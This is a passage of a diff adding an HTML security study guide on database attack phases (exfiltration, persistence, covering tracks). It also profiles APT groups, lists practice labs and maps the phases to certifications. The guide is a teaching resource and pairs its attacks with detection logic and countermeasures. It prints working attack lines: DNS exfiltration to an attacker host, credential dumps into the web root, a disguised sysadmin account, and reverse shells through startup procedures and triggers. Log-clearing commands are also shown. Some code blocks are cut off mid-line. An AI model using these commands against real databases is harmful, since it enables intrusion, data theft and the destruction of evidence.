+             <span class="sql-kw">FROM</span> users <span class="sql-kw">WHERE</span> username=<span class="sql-str">'admin'</span>)
+
+<span class="kw">EXEC</span>(<span class="sql-str">'master..xp_dirtree "//'</span>+@data+<span class="sql-str">'.exfil.attacker.com/x"'</span>)
+
+<span class="comment"># MySQL: Outbound HTTP via load_file SMB (Windows MSSQL too)</span>
+<span class="sql-kw">SELECT</span> * <span class="sql-kw">INTO OUTFILE</span> <span class="sql-str">'/var/www/html/data.txt'</span>
+<span class="sql-kw">FROM</span> users;   <span class="comment">-- Write to web root, then HTTP GET the file</span>
+
+<span class="comment"># PostgreSQL COPY to file in web-accessible directory</span>
+<span class="sql-kw">COPY</span> (SELECT username, password <span class="sql-kw">FROM</span> users) <span class="sql-kw">TO</span> <span class="sql-str">'/var/www/html/leaked.csv'</span>;
+
+<span class="comment"># dnscat2 — full bi-directional C2 over DNS (post-exploitation)</span>
+<span class="comment"># Server (attacker):</span>
+<span class="cmd">ruby dnscat2.rb attacker.com</span>
+<span class="comment"># Client (victim, injected via xp_cmdshell):</span>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>DNS exfil indicators: unusually long DNS query names (>50 char subdomains), high volume of DNS queries to a single domain from the DB host, queries with high entropy subdomain labels (Base32/Hex-encoded data), DNS to recently registered domains. Network rule: <code>dns.query.name length > 52 AND dns.src_ip IN db_server_range</code>. Monitor for file creation in web root directories by DB process identities.</p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li>DB servers should route DNS through an internal resolver only — block direct outbound UDP 53 to external IPs from DB hosts.</li>
+              <li><strong>NIST SP 800-53 SI-4:</strong> Information system monitoring — deploy DNS Security (e.g. Cisco Umbrella, Infoblox) with threat intel feeds to detect DGA and tunneling patterns.</li>
+              <li><strong>CIS Control 13.8:</strong> Deploy a data loss prevention (DLP) solution. At minimum, monitor for large SELECT * operations against sensitive tables from application-tier accounts.</li>
+              <li>MySQL/PostgreSQL: restrict FILE privilege to DBA accounts only. Remove it from application service accounts with <code>REVOKE FILE ON *.* FROM 'appuser'@'%'</code>.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 8: PERSISTENCE -->
+    <section id="persistence">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(46,213,115,0.1); color: var(--green);">08</div>
+          <h2>Persistence &amp; Backdooring</h2>
+        </div>
+        <div class="phase-body">
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--green)"><span class="dot" style="background:var(--green)"></span>Attacker Objective</div>
+              <p>Maintain access to the compromised database after initial exploitation is discovered or credential rotation occurs. Database-layer persistence is particularly resilient because it often survives OS-level remediation — DBAs frequently focus OS hardening without auditing stored procedures, triggers, and rogue user accounts.</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">TA0003 – Persistence</span><br><br>
+              <span class="mitre-tag">T1136 – Create Account</span><br><br>
+              <span class="mitre-tag">T1505.001 – SQL Stored Procedure</span><br><br>
+              <span class="mitre-tag">T1053 – Scheduled Task/Job</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--green)"><span class="dot" style="background:var(--green)"></span>Persistence Techniques</div>
+            <div class="code-header"><span>Rogue DB Users &amp; Stored Procedure Backdoors</span><span class="badge badge-green">Persistence</span></div>
+<pre><span class="comment">-- MSSQL: Create hidden sysadmin account with misleading name</span>
+<span class="sql-kw">CREATE LOGIN</span> [NT SERVICE\MSSQLSERVER] <span class="sql-kw">WITH PASSWORD</span>=<span class="sql-str">'P@ssw0rd!'</span>, CHECK_POLICY=OFF;
+<span class="sql-kw">EXEC</span> sp_addsrvrolemember <span class="sql-str">'NT SERVICE\MSSQLSERVER'</span>, <span class="sql-str">'sysadmin'</span>;
+<span class="comment">-- Name mimics a legitimate Windows service account — easily overlooked</span>
+
+<span class="comment">-- MSSQL: Stored procedure backdoor executing on startup</span>
+<span class="sql-kw">USE</span> master;
+<span class="sql-kw">CREATE PROCEDURE</span> sp_health_check <span class="sql-kw">AS</span>
+  <span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'powershell -w hidden -enc [ENCODED_REVERSE_SHELL]'</span>;
+<span class="sql-kw">EXEC</span> sp_procoption <span class="sql-str">'sp_health_check'</span>, <span class="sql-str">'startup'</span>, <span class="str">true</span>;
+<span class="comment">-- Executes every time MSSQL service starts</span>
+
+<span class="comment">-- MySQL: Trigger-based persistence (executes on every user login)</span>
+<span class="sql-kw">CREATE TRIGGER</span> after_login <span class="sql-kw">AFTER INSERT ON</span> audit_log
+<span class="sql-kw">FOR EACH ROW BEGIN</span>
+  CALL sys_exec(<span class="sql-str">'curl http://attacker.com/ping'</span>);
+<span class="sql-kw">END</span>;
+
+<span class="comment">-- PostgreSQL: Event trigger (fires on DDL events — very resilient)</span>
+<span class="sql-kw">CREATE OR REPLACE FUNCTION</span> malicious_fn() <span class="sql-kw">RETURNS event_trigger AS</span> $$
+  <span class="sql-kw">BEGIN</span>
+    <span class="kw">PERFORM</span> pg_sleep(0);  <span class="comment">-- Replace with actual payload</span>
+    COPY shell_out <span class="sql-kw">FROM PROGRAM</span> <span class="sql-str">'bash -c "bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1"'</span>;
+  <span class="sql-kw">END;</span>
+$$ LANGUAGE plpgsql;
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Alert on: new SQL login creation events (MSSQL Event ID 33205), stored procedures added with <code>sp_procoption startup=true</code>, CREATE TRIGGER / CREATE EVENT TRIGGER DDL events from non-DBA accounts, any use of <code>xp_cmdshell</code> within stored procedures. Baseline all stored procedures and triggers at deployment, alert on any deviation. Schedule weekly audits: <code>SELECT name,create_date FROM sys.procedures WHERE create_date > DATEADD(day,-7,GETDATE())</code></p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>NIST SP 800-53 AC-2:</strong> Account management — implement automated alerting for new privileged database account creation. Review and certify all DB accounts quarterly.</li>
+              <li><strong>CIS Control 16.13:</strong> Alert on account creation on Enterprise Assets. Map DB account creation to this control.</li>
+              <li>Maintain signed checksums of all stored procedures and triggers. Any modification should trigger a security review workflow.</li>
+              <li>Disable <code>sp_procoption</code> startup procedures unless operationally required. Audit regularly with <code>SELECT name FROM sys.procedures WHERE OBJECTPROPERTY(object_id, 'ExecIsStartup')=1</code>.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 9: COVERING TRACKS -->
+    <section id="tracks">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(138,155,176,0.15); color: var(--muted);">09</div>
+          <h2>Covering Tracks</h2>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--muted)"><span class="dot" style="background:var(--muted)"></span>Attacker Objective + MITRE Mapping</div>
+            <p style="font-size:13.5px;color:var(--muted);margin-bottom:12px;">Erase evidence of compromise from DB audit logs, transaction logs, and OS event logs. The goal is to delay or prevent incident detection, destroy forensic artifacts, and extend dwell time. Notably, DB-layer log manipulation requires the same privileges used for exploitation — so evidence of privilege abuse often predates log clearing.</p>
+            <p><span class="mitre-tag">TA0005 – Defense Evasion</span> &nbsp; <span class="mitre-tag">T1070.002 – Clear Linux/Mac System Logs</span> &nbsp; <span class="mitre-tag">T1562.006 – Disable/Modify Audit Logs</span></p>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--muted)"><span class="dot" style="background:var(--muted)"></span>Log Manipulation Techniques</div>
+            <div class="code-header"><span>DB Log Manipulation Commands</span><span class="badge badge-yellow">Anti-Forensics</span></div>
+<pre><span class="comment">-- MSSQL: Truncate transaction log (prevents forensic timeline reconstruction)</span>
+<span class="sql-kw">USE</span> target_db;
+<span class="sql-kw">BACKUP LOG</span> target_db <span class="sql-kw">TO DISK</span>=<span class="sql-str">'NUL'</span> <span class="sql-kw">WITH TRUNCATE_ONLY</span>;
+<span class="comment">-- Or set recovery model to SIMPLE to auto-truncate:</span>
+<span class="sql-kw">ALTER DATABASE</span> target_db <span class="sql-kw">SET RECOVERY SIMPLE</span>;
+
+<span class="comment">-- MSSQL: Disable SQL Server Audit</span>
+<span class="sql-kw">ALTER SERVER AUDIT</span> MyAudit <span class="sql-kw">WITH</span> (STATE=OFF);
+<span class="sql-kw">DROP SERVER AUDIT</span> MyAudit;   <span class="comment">-- Removes audit entirely</span>
+
+<span class="comment">-- MySQL: Flush general query log</span>
+<span class="sql-kw">SET GLOBAL</span> general_log = <span class="str">'OFF'</span>;
+<span class="sql-kw">FLUSH LOGS</span>;
+<span class="comment"># OS level (if xp_cmdshell/UDF): clear the log file</span>
+<span class="cmd">echo</span> "" > /var/log/mysql/mysql.log
+
+<span class="comment">-- PostgreSQL: Disable logging via config reload (if superuser)</span>
+<span class="sql-kw">ALTER SYSTEM SET</span> logging_collector = <span class="str">'off'</span>;
+<span class="sql-kw">SELECT pg_reload_conf()</span>;
+
+<span class="comment"># Windows Event Log clearing (via xp_cmdshell on MSSQL host)</span>
+<span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'wevtutil cl Security'</span>;
+<span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'wevtutil cl Application'</span>;
+
+<span class="comment"># Timestomping — modify file timestamps on log files</span>
+          </div>
+
+          <div class="callout">
+            <strong>Forensic Note:</strong> Paradoxically, covering tracks often generates its own forensic artifacts. MSSQL audit of the audit-disabling event, Windows Security Event 1102 (audit log cleared), and gaps in log timestamps are all high-confidence indicators of post-exploitation activity for a skilled DFIR analyst. Log clearing is itself a SIEM alerting event.
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Windows Event ID 1102 (audit log cleared) and 4719 (system audit policy changed) should trigger immediate Priority 1 alerts. MSSQL: alert on <code>ALTER SERVER AUDIT</code> and <code>BACKUP LOG ... WITH TRUNCATE_ONLY</code> statements. Forward logs to an immutable SIEM/log aggregator in real time — logs stored only on the compromised host are trivially destroyed. Use write-once storage (WORM) for compliance-critical audit logs per NIST SP 800-92.</p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>NIST SP 800-53 AU-9:</strong> Protection of audit information — audit logs must be stored on separate, access-controlled infrastructure that DB service accounts cannot reach.</li>
+              <li><strong>CIS Control 8.2:</strong> Collect audit logs. Centralize to a SIEM with network-level transport (syslog/Filebeat) so logs leave the host immediately, before an attacker can clear them.</li>
+              <li>Grant audit log viewing to security team only. DB admins should not have permission to modify audit configuration without a separate approval workflow (4-eyes principle).</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- THREAT ACTOR PROFILES -->
+    <section id="apt-profiles">
+      <div class="section-title">Threat Actor Profiles</div>
+      <div class="section-sub">APT groups that have historically weaponized database exploitation as part of intrusion chains</div>
+
+      <div class="apt-card">
+        <div class="apt-name">APT28 / Fancy Bear (GRU Unit 26165)</div>
+        <div class="apt-meta">
+          <span class="badge badge-red">Russian State</span>
+          <span class="badge badge-orange">Espionage</span>
+          <span class="badge badge-yellow">Active since 2004</span>
+        </div>
+        <div class="apt-body">
+          Responsible for the 2016 Democratic National Committee breach and numerous government/military intrusions. APT28 chains SQL injection in public-facing web applications against MSSQL backends to establish initial database access, then pivots via xp_cmdshell to Windows host execution. Notably exploited CVE-2023-23397 (Outlook NTLM hash capture) to harvest credentials that were subsequently used for MSSQL authentication without ever triggering a SQLi alert. Their toolset includes X-Agent, Sofacy, and X-Tunnel for post-exploitation C2. MITRE ATT&CK Group: G0007.
+        </div>
+      </div>
+
+      <div class="apt-card">
+        <div class="apt-name">FIN7 / Carbanak</div>
+        <div class="apt-meta">
+          <span class="badge badge-orange">Financially Motivated</span>
+          <span class="badge badge-red">Cybercrime</span>
+          <span class="badge badge-yellow">Active since 2013</span>
+        </div>
+        <div class="apt-body">
+          Responsible for over $1 billion in financial sector losses. FIN7's primary vector against restaurant and retail chains was spear-phishing that installed CARBANAK malware, which specifically targeted POS systems' backend SQL Server databases to harvest payment card data. Their technique for lateral movement frequently involved extracting MSSQL service account NTLM hashes via network traffic capture and using those to authenticate to adjacent SQL Server instances in the same domain — a direct application of Phase 6's PtH technique. MITRE ATT&CK Group: G0046.
+        </div>
+      </div>
+
+      <div class="apt-card">
+        <div class="apt-name">Lazarus Group (North Korea, Bureau 121)</div>
+        <div class="apt-meta">
+          <span class="badge badge-red">Nation-State</span>
+          <span class="badge badge-orange">Financial Theft</span>
+          <span class="badge badge-yellow">Active since 2009</span>
+        </div>
+        <div class="apt-body">
+          Behind the 2016 Bangladesh Bank SWIFT heist ($81M stolen) where Oracle DB systems were compromised to manipulate SWIFT transaction records. Lazarus used stolen credentials to access Oracle databases, deleted transaction audit logs (Phase 9 directly applied), and modified stored procedures to approve fraudulent transfers. This is the canonical real-world example of persistence (stored procedure modification) and covering tracks (log deletion) in a database context having catastrophic financial consequences. MITRE ATT&CK Group: G0032.
+        </div>
+      </div>
+    </section>
+
+    <!-- LAB SETUP -->
+    <section id="lab-setup">
+      <div class="section-title">Recommended Lab Setup</div>
+      <div class="section-sub">Legal, realistic environments for practising every phase covered in this guide</div>
+
+      <div class="lab-item">
+        <div class="lab-icon">🎯</div>
+        <div>
+          <div class="lab-name">HackTheBox — Retired Machines</div>
+          <div class="lab-desc">Machines specifically valuable for DB exploitation: <strong>Querier</strong> (MSSQL + xp_cmdshell + NTLM hash capture via xp_dirtree — covers Phases 2,5,6 perfectly), <strong>Bankrobber</strong> (SQLi + MSSQL xp_cmdshell), <strong>Enterprise</strong> (PostgreSQL injection), <strong>Tartarsauce</strong> (MySQL). Pro Lab: RastaLabs and Offshore contain enterprise AD + MSSQL environments representative of real corporate targets.</div>
+        </div>
+      </div>
+
+      <div class="lab-item">
+        <div class="lab-icon">🕷</div>
+        <div>
+          <div class="lab-name">DVWA (Damn Vulnerable Web Application)</div>
+          <div class="lab-desc">Self-hosted PHP/MySQL application with difficulty levels (Low/Medium/High/Impossible). SQL Injection and Blind SQL Injection modules provide clean environments for manual payload development and SQLMap familiarity. Deploy with Docker: <code>docker run -d -p 80:80 vulnerables/web-dvwa</code>. All four SQLi types can be practiced at different security levels.</div>
+        </div>
+      </div>
+
+      <div class="lab-item">
+        <div class="lab-icon">🌐</div>
+        <div>
+          <div class="lab-name">OWASP WebGoat &amp; WebWolf</div>
+          <div class="lab-desc">Structured lesson-based platform with dedicated SQL Injection modules covering UNION attacks, blind SQLi, and second-order injection. Particularly useful for understanding ORM bypasses and NoSQL injection (Lesson 9 covers MongoDB injection). Deploy: <code>docker run -p 8080:8080 -p 9090:9090 webgoat/goatandwolf</code>.</div>
+        </div>
+      </div>
+
+      <div class="lab-item">
+        <div class="lab-icon">🗃</div>
+        <div>
+          <div class="lab-name">SQLi-labs (GitHub: Audi-1/sqli-labs)</div>
+          <div class="lab-desc">65 progressively difficult SQL injection challenges covering every technique in Phase 4: error-based, UNION-based, blind boolean, blind time-based, header injection, and second-order. Each lab isolates one specific bypass technique — ideal for building mental models before attempting automated tooling.</div>
+        </div>
+      </div>
+
+      <div class="lab-item">
+        <div class="lab-icon">🏭</div>
+        <div>
+          <div class="lab-name">VulnHub — MSSQL / Oracle Specific</div>
+          <div class="lab-desc"><strong>Kioptrix Level 1.1:</strong> MySQL injection to OS command execution chain. <strong>pWnOS 2.0:</strong> PostgreSQL exploitation. <strong>Metasploitable 2:</strong> Multiple DB services (MySQL root with no password, PostgreSQL) pre-configured for exploitation. For Oracle: Oracle's own "Database Vault" demo VMs provide realistic Oracle 19c targets for TNS listener and privilege escalation practice.</div>
+        </div>
+      </div>
+
+      <div class="lab-item">
+        <div class="lab-icon">🐳</div>
+        <div>
+          <div class="lab-name">Custom Docker Lab — Full Attack Chain</div>
+          <div class="lab-desc">Build your own multi-tier lab: <code>docker-compose</code> with nginx (reverse proxy) + PHP app + MSSQL + Responder on a separate container. This replicates the realistic architecture where SQLi in a web app leads to MSSQL exploitation, NTLM hash capture via xp_dirtree, and lateral movement. Required for practicing Phases 5, 6, and 7 end-to-end in a controlled environment.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CERT ALIGNMENT MATRIX -->
+    <section id="cert-matrix">
+      <div class="section-title">Certification Alignment Matrix</div>
+      <div class="section-sub">Each attack phase mapped to specific exam objectives across four professional certifications</div>
+
+      <div class="phase-card">
+        <div class="phase-body">
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Phase</th>
+                  <th><span style="color:#2ed573">CEH v12</span></th>
+                  <th><span style="color:#ff6b35">OSCP / PEN-200</span></th>
+                  <th><span style="color:#0099ff">Security+ SY0-701</span></th>
+                  <th><span style="color:#b06bff">eWPTX</span></th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>01 – Reconnaissance</td>
+                  <td>Module 2: Footprinting & Reconnaissance; OSINT tools, Shodan, Maltego</td>
+                  <td>PEN-100: Passive Info Gathering; Reconnaissancereconnaissance methodology section</td>
+                  <td>Domain 4.1: Threat intelligence; OSINT sources and techniques</td>
+                  <td>Section 2: Information Gathering; passive recon, OSINT frameworks</td>
+                </tr>
+                <tr>
+                  <td>02 – Initial Access</td>
+                  <td>Module 16: SQL Injection; authentication bypass techniques</td>
+                  <td>PEN-200: Active Directory Attacks; initial foothold via service exploitation</td>
+                  <td>Domain 2.4: Malicious Activity; credential-based attacks, spraying</td>
+                  <td>Section 4: Authentication Attacks; credential stuffing, default credentials</td>
+                </tr>
+                <tr>
+                  <td>03 – Vuln Discovery</td>
+                  <td>Module 6: System Hacking; vulnerability scanning, CVE research</td>
+                  <td>PEN-200: Vulnerability Scanning; manual vs automated discovery methodology</td>
+                  <td>Domain 4.3: Vulnerability Scanning; interpreting scan output, CVSS scoring</td>
+                  <td>Section 3: Mapping &amp; Fingerprinting; error analysis, version detection</td>
+                </tr>
+                <tr>
+                  <td>04 – Exploitation</td>
+                  <td>Module 16: SQL Injection (full); UNION, blind, stored, OOB, NoSQLi</td>
+                  <td>PEN-200: SQL Injection Attacks (dedicated chapter); manual and SQLMap</td>
+                  <td>Domain 2.4: Application Attacks; injection attacks, input validation flaws</td>
+                  <td>Section 5: SQL Injection (core module); all injection types, WAF bypass</td>
+                </tr>
+                <tr>
+                  <td>05 – Post-Exploitation</td>
+                  <td>Module 6: System Hacking; privilege escalation, command execution</td>
+                  <td>PEN-200: Post-Exploitation; MSSQL pivoting, xp_cmdshell, local PrivEsc</td>
+                  <td>Domain 2.4: Privilege Escalation techniques and indicators</td>
+                  <td>Section 8: Post-Exploitation; OS command injection from DB context</td>
+                </tr>
+                <tr>
+                  <td>06 – Credential Harvesting</td>
+                  <td>Module 6: System Hacking; hash extraction, Pass-the-Hash, Mimikatz</td>
+                  <td>PEN-200: Password Attacks; Hashcat, John, PtH in AD environments</td>
+                  <td>Domain 2.4: Credential theft; on-path attacks, relay techniques</td>
+                  <td>Section 7: Credential Attacks; hash harvesting, cracking, relay</td>
+                </tr>
+                <tr>
+                  <td>07 – Exfiltration</td>
+                  <td>Module 7: Malware; covert channels, DNS tunneling</td>
+                  <td>PEN-200: Data Exfiltration; file transfer techniques, covert channels</td>
+                  <td>Domain 2.4: Data Exfiltration indicators and monitoring</td>
+                  <td>Section 9: OOB Techniques; DNS/HTTP exfil from injection</td>
+                </tr>
+                <tr>
+                  <td>08 – Persistence</td>
+                  <td>Module 6: System Hacking; maintaining access, backdoors, rootkits</td>
+                  <td>PEN-200: Active Directory Persistence; domain persistence techniques</td>
+                  <td>Domain 2.4: Malicious Activity; persistence mechanisms, triggers</td>
+                  <td>Section 8: Persistence; stored procedure abuse, DB-level backdoors</td>
+                </tr>
+                <tr>
+                  <td>09 – Covering Tracks</td>
+                  <td>Module 6: System Hacking; log manipulation, anti-forensics</td>
+                  <td>PEN-200: Reporting; understanding evidence artifacts for remediation</td>
+                  <td>Domain 4.9: Incident Response; log analysis, evidence preservation</td>
+                  <td>Section 10: Anti-Forensics; log clearing, audit bypass in web context</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="callout" style="margin-top:1.5rem;">
+        <strong>Study Priority:</strong> For OSCP (PEN-200), the highest-value phases are 03, 04, 05 — SQL injection to OS command execution is a repeatable path in the exam lab environment. For CEH v12, Module 16 (SQL Injection) maps to 6+ of the 9 phases above and deserves disproportionate study time. For eWPTX (most technically demanding web security cert), Phases 04, 07, and the NoSQL injection content are the primary differentiators from lower-level certifications.
+      </div>
+    </section>
+
+    <div style="height:4rem;"></div>
+</main>
+</div>
+<script>
+  // Sidebar active link tracking
+  const sections = document.querySelectorAll('section[id]');
+  const links = document.querySelectorAll('.sidebar a');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.sidebar a[href="#${entry.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+</body>
+</html>
